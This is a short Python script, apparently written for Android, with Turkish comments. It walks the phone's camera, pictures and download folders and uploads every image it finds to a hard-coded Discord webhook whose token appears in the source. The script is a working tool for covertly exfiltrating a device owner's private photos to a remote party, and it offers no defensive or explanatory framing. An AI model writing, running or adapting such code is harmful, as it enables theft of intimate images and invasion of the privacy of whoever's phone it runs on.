import os
import requests

# Webhook URL'ni buraya yaz!
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1438927391929012276/XuNKR8tAGae0sKiTfSb6XRcTdis557KbTJGDlimnjQHfrNvoJBfn7HW1b08GU_eBXIVI"

def upload_file_to_discord(file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            response = requests.post(DISCORD_WEBHOOK_URL, files=files)
        if response.status_code in [200, 204]:
            print(f"✅ {file_path} gönderildi")
        else:
            print(f"❌ {file_path} gönderilemedi: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"⚠️ Hata oluştu: {file_path}: {e}")

def find_images_in_gallery():
    gallery_paths = [
        '/sdcard/DCIM/Camera',
        '/sdcard/Pictures',
        '/storage/emulated/0/DCIM/Camera',
        '/storage/emulated/0/Pictures',
        '/sdcard/Download'
    ]
    image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')
    image_files = []
    for folder in gallery_paths:
        if os.path.exists(folder):
            for root, dirs, files in os.walk(folder):
                for file in files:
                    if file.lower().endswith(image_extensions):
                        image_files.append(os.path.join(root, file))
    return image_files

if __name__ == '__main__':
    print("Galeri taranıyor...")
    images = find_images_in_gallery()
    print(f"{len(images)} fotoğraf bulundu, gönderiliyor.")
    for img in images:
        upload_file_to_discord(img)
    print("Tüm fotoğraflar gönderildi.")
